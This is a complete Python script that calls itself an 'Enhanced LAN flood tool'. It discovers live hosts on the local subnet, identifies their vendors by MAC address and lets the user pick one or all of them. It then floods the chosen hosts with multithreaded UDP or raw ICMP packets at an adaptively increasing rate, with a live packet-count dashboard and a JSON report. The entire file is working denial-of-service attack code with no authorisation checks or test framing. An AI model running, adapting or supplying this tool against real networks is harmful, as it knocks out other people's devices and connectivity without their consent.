#!/usr/bin/env python3
import argparse
import threading
import socket
import random
import sys
import time
import subprocess
import errno
import asyncio
import curses
import json
from pathlib import Path

from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
from manuf import manuf
import aioping  # pip install aioping

# === Asynchronous LAN Scan (IPv4 & IPv6) ===
async def async_ping(ip: str, family=socket.AF_INET) -> bool:
    try:
        if family == socket.AF_INET:
            await aioping.ping(ip, timeout=1)
        else:
            await aioping.ping6(ip, timeout=1)
        return True
    except:
        return False

async def scan_lan_async(ipv6=False) -> list[str]:
    # Determine local base
    af = socket.AF_INET6 if ipv6 else socket.AF_INET
    s = socket.socket(af, socket.SOCK_DGRAM)
    try:
        target = ('2001:4860:4860::8888', 80) if ipv6 else ('8.8.8.8', 80)
        s.connect(target)
        local_ip = s.getsockname()[0]
    except:
        print("[-] Cannot determine local IP.")
        sys.exit(1)
    finally:
        s.close()

    if ipv6:
        # Simplified: just return the host itself for IPv6
        hosts = [local_ip]
    else:
        parts = local_ip.split('.')[:3]
        base = '.'.join(parts) + '.'
        hosts = [f"{base}{i}" for i in range(1,255) if f"{base}{i}" != local_ip]

    tasks = [asyncio.create_task(async_ping(ip, af)) for ip in hosts]
    results = await asyncio.gather(*tasks)
    return sorted([ip for ip,ok in zip(hosts,results) if ok],
                  key=lambda ip: list(map(int, ip.split('.') if not ipv6 else [0])))

# === Vendor Resolution ===
def resolve_vendors(hosts: list[str]) -> list[tuple[str,str,str]]:
    proc = subprocess.run(["ip","neigh"], capture_output=True, text=True)
    neigh = {}
    for line in proc.stdout.splitlines():
        parts = line.split()
        if len(parts)>=5 and parts[2]=="lladdr":
            neigh[parts[0]] = parts[4]
    parser = manuf.MacParser()
    out = []
    for ip in hosts:
        mac = neigh.get(ip)
        if not mac or mac.count(':')!=5:
            vendor = "Unknown"
        else:
            try: vendor = parser.get_manuf(mac) or "Unknown"
            except: vendor = "Unknown"
        out.append((ip, mac or 'n/a', vendor))
    return out

# === UDP Port Probe ===
def probe_udp_port(ip: str, port: int, timeout: float=1.0) -> bool:
    fam = socket.AF_INET6 if ':' in ip else socket.AF_INET
    sock = socket.socket(fam, socket.SOCK_DGRAM)
    try:
        sock.settimeout(timeout)
        sock.sendto(b"", (ip, port))
        sock.recvfrom(1024)
        return True
    except socket.timeout:
        return True
    except socket.error as e:
        return False if e.errno==errno.ECONNREFUSED else True
    finally:
        sock.close()

def pick_best_udp_port(ip: str) -> int:
    for p in [53,161,123,500,67,68]:
        print(f"[*] Probing UDP/{p}…", end=' ')
        if probe_udp_port(ip,p):
            print("open/filtered")
            return p
        print("closed")
    print("[!] Fallback to random ports (0)")
    return 0

# === Dynamic Rate Controller ===
class RateController:
    def __init__(self, target_rtt_ms: float=50.0):
        self.target,self.rate = target_rtt_ms,1.0
    def adjust(self, current_rtt: float) -> float:
        self.rate *= 0.9 if current_rtt>self.target else 1.1
        self.rate = max(0.1, min(self.rate, 10.0))
        return self.rate

# === Flood Workers ===
def _worker_udp(ip, port, packet_size, deadline, iface, rate_ctrl, stats, tid):
    fam = socket.AF_INET6 if ':' in ip else socket.AF_INET
    sock = socket.socket(fam, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
        if iface: sock.setsockopt(socket.SOL_SOCKET,25,iface.encode()+b"\0")
    except: pass

    payload = random._urandom(packet_size)
    rnd = random.randint
    batch = 64
    next_adj = time.time()+1
    sent = 0

    while time.time() < deadline:
        for _ in range(batch):
            try:
                dst = (ip, port) if port else (ip, rnd(1,65535))
                sock.sendto(payload, dst)
                sent += 1
            except:
                # If we run out of socket buffers, back off a bit
                err = sys.exc_info()[1]
                if hasattr(err, 'errno') and err.errno == errno.ENOBUFS:
                    time.sleep(0.005)
                # else ignore other errors
        if time.time() >= next_adj:
            # measure RTT
            try:
                cmd = ["ping6","-c","1","-W","1",ip] if ':' in ip else ["ping","-c","1","-W","1",ip]
                out = subprocess.check_output(cmd, text=True)
                t = float(out.split("time=")[1].split()[0])
            except:
                t = rate_ctrl.target
            batch = int(64 * rate_ctrl.adjust(t)) or 1
            next_adj += 1

    stats[ip][tid] = sent

def flood_udp(ip, port, packet_size, duration, threads, iface, rate_ctrl, stats):
    deadline = time.time() + duration
    for tid in range(threads):
        threading.Thread(
            target=_worker_udp,
            args=(ip, port, packet_size, deadline, iface, rate_ctrl, stats, tid),
            daemon=True
        ).start()

def _worker_icmp(ip, packet_size, deadline, iface, stats, tid):
    import struct, os
    ICMP_ECHO=8; pid=os.getpid()&0xffff; seq=0
    def checksum(data: bytes):
        if len(data)%2: data+=b"\0"
        s=0
        for i in range(0,len(data),2): s+=(data[i]<<8)+data[i+1]
        s=(s>>16)+(s&0xffff); s+=s>>16
        return (~s)&0xffff

    fam = socket.AF_INET6 if ':' in ip else socket.AF_INET
    try:
        sock = socket.socket(fam, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        if iface: sock.setsockopt(socket.SOL_SOCKET,25,iface.encode()+b"\0")
    except:
        return

    sent = 0
    while time.time() < deadline:
        seq = (seq+1) & 0xffff
        hdr = struct.pack('!BBHHH', ICMP_ECHO, 0, 0, pid, seq)
        payload = random._urandom(packet_size-len(hdr))
        ch = checksum(hdr+payload)
        pkt = struct.pack('!BBHHH', ICMP_ECHO, 0, ch, pid, seq) + payload
        try:
            sock.sendto(pkt, (ip,0))
            sent += 1
        except:
            pass

    stats[ip][tid] = sent

def flood_icmp(ip, _, packet_size, duration, threads, iface, stats):
    deadline = time.time() + duration
    for tid in range(threads):
        threading.Thread(
            target=_worker_icmp,
            args=(ip, packet_size, deadline, iface, stats, tid),
            daemon=True
        ).start()

# === Live Curses Dashboard ===
def dashboard(stats, duration):
    stdscr = curses.initscr()
    curses.noecho()
    curses.cbreak()
    try:
        for sec in range(duration):
            stdscr.clear()
            stdscr.addstr(0,0,f"Time: {sec}/{duration}s")
            row = 2
            total = 0
            for ip,counts in stats.items():
                s = sum(counts)
                total += s
                stdscr.addstr(row,0,f"{ip}: {s} packets")
                row += 1
            stdscr.addstr(row+1,0,f"Grand total: {total}")
            stdscr.refresh()
            time.sleep(1)
    finally:
        curses.echo()
        curses.nocbreak()
        curses.endwin()

# === Automated Cleanup & Reporting ===
def generate_report(stats, duration, args):
    report = {
        'timestamp': time.time(),
        'mode': args.mode,
        'ipv6': args.ipv6,
        'targets': list(stats.keys()),
        'duration': duration,
        'stats': {ip: sum(c) for ip,c in stats.items()}
    }
    out = Path('flood_report.json')
    out.write_text(json.dumps(report, indent=2))
    print(f"[+] Report saved to {out}")

# === Main ===
def main():
    p = argparse.ArgumentParser(description="Enhanced LAN flood tool")
    p.add_argument("--mode", choices=["udp","icmp"], default="udp")
    p.add_argument("--ipv6", action="store_true")
    p.add_argument("--autoport", action="store_true")
    p.add_argument("-s","--packet-size", type=int)
    p.add_argument("-d","--duration", type=int)
    p.add_argument("-t","--threads", type=int)
    p.add_argument("-i","--iface", default="")
    args = p.parse_args()

    # 1) Scan
    hosts = asyncio.run(scan_lan_async(ipv6=args.ipv6))
    info = resolve_vendors(hosts)
    print("\nLive hosts:")
    for idx, (ip, mac, vendor) in enumerate(info, 1):
        print(f"  {idx:3d}) {ip:16s} {mac:17s} {vendor}")
    print("    0) ALL hosts")
    sel = input(f"Select target (0–{len(info)}): ").strip()
    targets = [ip for ip,_,_ in info] if sel=="0" else [info[int(sel)-1][0]]

    # 2) Port selection
    port = 0
    if args.mode=="udp" and args.autoport and len(targets)==1:
        port = pick_best_udp_port(targets[0])

    # 3) Other parameters
    if args.packet_size is None: args.packet_size = int(input("Packet size: ").strip())
    if args.duration is None:    args.duration    = int(input("Duration (s): ").strip())
    if args.threads is None:     args.threads     = int(input("Threads per target: ").strip())
    iface = args.iface or None

    print(f"\n[*] Mode={args.mode} IPv6={args.ipv6} Targets={len(targets)} "
          f"Port={port} Size={args.packet_size} Duration={args.duration}s "
          f"Threads={args.threads} Iface={iface or 'default'}\n")

    # 4) Launch flood
    stats = {ip: [0]*args.threads for ip in targets}
    rate_ctrl = RateController()
    for ip in targets:
        if args.mode=="udp":
            flood_udp(ip, port, args.packet_size, args.duration, args.threads, iface, rate_ctrl, stats)
        else:
            flood_icmp(ip, port, args.packet_size, args.duration, args.threads, iface, stats)

    # 5) Dashboard
    dashboard(stats, args.duration)

    # 6) Report
    generate_report(stats, args.duration, args)

if __name__ == "__main__":
    main()
